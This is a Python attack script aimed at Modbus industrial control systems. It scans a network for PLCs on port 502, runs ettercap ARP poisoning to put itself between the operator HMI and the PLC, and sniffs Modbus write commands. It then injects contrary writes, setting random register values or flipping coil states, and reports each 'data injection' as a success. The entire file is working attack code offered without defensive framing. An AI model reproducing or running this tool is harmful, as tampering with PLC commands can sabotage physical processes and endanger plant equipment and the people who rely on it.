import modbus_tk.modbus_tcp as mt
import modbus_tk.defines as md
from time import *
from scapy.all import *
from random import *
import os, nmap
from scapy.contrib import modbus


#start = time.perf_counter()
#plc = mt.TcpMaster('10.55.0.6', 502)
plc_ip = ''
hmi_ip = ''

def changeData_reg(plc, addr, val):
        plc = mt.TcpMaster(plc, 502)
        plc.execute(slave=1, function_code=(md.WRITE_MULTIPLE_REGISTERS), starting_address=addr, quantity_of_x=1, output_value=[val])

def changeData0(plc, addr):
        plc = mt.TcpMaster(plc, 502)
        plc.execute(slave=1, function_code=(md.WRITE_SINGLE_COIL), starting_address=addr, quantity_of_x=1, output_value=0)

def changeData1(plc, addr):
        plc = mt.TcpMaster(plc, 502)
        plc.execute(slave=1, function_code=(md.WRITE_SINGLE_COIL), starting_address=addr, quantity_of_x=1, output_value=1)

def scan():
        nm = nmap.PortScanner()
        net = input("enter your network : ")
        nm.scan(hosts=net, arguments='-n -p502 --script modbus-discover.nse')
        hosts_list = [(x, nm[x]['tcp'][502]['state']) for x in nm.all_hosts()]
        for host, state in hosts_list:
            if state == 'open':
                global plc_ip
                plc_ip = host
                print("PLC IP : {}".format(plc_ip))

def psniff(plcip):
        fil = "dst host {} and dst port 502 and tcp[13] = 0x18".format(plcip)
        p = sniff(iface="eth0", count=1, filter=fil)
        x = p[0]
        global hmi_ip
        hmi_ip = x[IP].src
        print("HMI IP : {}".format(hmi_ip))

def get_ip():
        scan()
        arp1 = 'nohup ettercap -Tq -i eth0 -M ARP /{}// >/dev/null 2>&1 &'.format(plc_ip)
        os.system(arp1)
        psniff(plc_ip)
        os.system('pkill -f ettercap')
        sleep(1)

def arp_spoofing():
        arp2 = 'nohup ettercap -Tq -i eth0 -M ARP:oneway /{hmi}// /{plc}// >/dev/null 2>&1 &'.format(hmi=hmi_ip, plc=plc_ip)
        os.system(arp2)
        process = os.popen('pgrep -f ettercap')
        out = process.read()
        process.close()
        print("ettercap is running, PID : {}".format(out))
        print("ARP Poisoning start !!")
        sleep(4)

def cap():
        while True:
                xx = 1
                while xx:
                        pp = "dst host {} and tcp[13] = 0x18".format(plc_ip)
                        plc_frames = sniff(iface="eth0", count=1, filter=pp)
                        modbus_query = plc_frames[0]
                        try:
                                if modbus_query.funcCode == 16:
                                        addr1 = modbus_query.startAddr
                                        val1 = randrange(100, 10000)
                                        changeData_reg(plc_ip, addr1, val1)
                                        xx = 0
                                        print("\033[1;36m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
                                elif modbus_query.funcCode == 5:
                                        if modbus_query.outputValue == 65280:
                                                addr2 = modbus_query.outputAddr
                                                changeData0(plc_ip, addr2)
                                                xx = 0
                                                print("\033[1;35m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                                print("\033[1;36m{}\033[0m".format(modbus_query.show()))
                                        elif modbus_query.outputValue == 0:
                                                addr3 = modbus_query.outputAddr
                                                changeData1(plc_ip, addr3)
                                                xx = 0
                                                print("\033[1;33m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                                print("\033[1;36m{}\033[0m".format(modbus_query.show()))
                        except:
                                xx = 1

def main():
        get_ip()
        arp_spoofing()
        cap()

main()
#end = time.perf_counter()
#print("\033[1;33m=====================Executed time : {}s ======================\033[0m".format(end-start))
